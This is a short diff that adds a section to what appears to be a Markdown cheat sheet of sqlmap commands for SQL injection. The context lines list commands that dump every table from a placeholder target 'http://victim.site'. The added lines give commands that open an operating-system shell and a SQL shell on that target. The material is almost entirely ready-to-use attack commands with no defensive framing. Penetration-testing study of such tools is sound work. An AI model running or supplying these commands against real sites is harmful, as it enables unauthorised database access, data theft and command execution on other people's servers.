@@ -73,3 +73,14 @@ sqlmap --url ‘http://victim.site’  --tables // gets all tables
 sqlmap --url ‘http://victim.site’  --batch //
 ```
 
+## Getting a direct SQL Shell
+
+```bash
+# Get a OS shell
+sqlmap --url ‘http://victim.site’  --os-shell
+
+# GEt a SQL shell
+sqlmap --url ‘http://victim.site’  --sql-shell
+
+
+```
